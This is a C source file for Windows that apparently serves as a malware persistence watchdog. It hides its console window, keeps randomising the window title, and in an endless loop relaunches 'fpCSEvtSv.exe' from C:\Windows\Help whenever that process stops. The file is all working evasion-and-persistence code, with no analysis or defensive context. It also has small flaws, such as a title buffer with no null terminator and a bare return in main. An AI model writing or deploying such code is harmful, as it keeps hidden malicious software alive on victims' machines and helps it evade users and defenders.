#define _WIN32_WINNT 0x0500
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <stdbool.h>


bool IsProcessRunning(const TCHAR* const executableName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    const auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (!Process32First(snapshot, &entry)) {
        CloseHandle(snapshot);
        return false;
    }
    do {
        if (!_tcsicmp(entry.szExeFile, executableName)) {
            CloseHandle(snapshot);
            return true;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
    return false;
}

int main(void){
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    srand(time(NULL));
    int dl = (int)5+(rand()%5);
    char r[dl];
    for( int i=0; i<dl; i++){
        r[i]=(char)(65+(rand()%26));
    }
    SetWindowTextA(hWnd, r);
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    char d[]="C:\\Windows\\Help\\fpCSEvtSv.exe";

    while(1){
        if(IsProcessRunning("fpCSEvtSv.exe")){
            //printf("yooo");
        }
        else{
        if( !CreateProcess( NULL, d, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi )){
                printf( "CreateProcess failed (%d).\n", GetLastError() );
                return;
            }
        else{
                CloseHandle( pi.hProcess );
                CloseHandle( pi.hThread );
            }
        }
        for( int i=0; i<dl; i++){
            r[i]=(char)(65+(rand()%26));
        }
        SetWindowTextA(hWnd, r);
        sleep(10);
    }
}
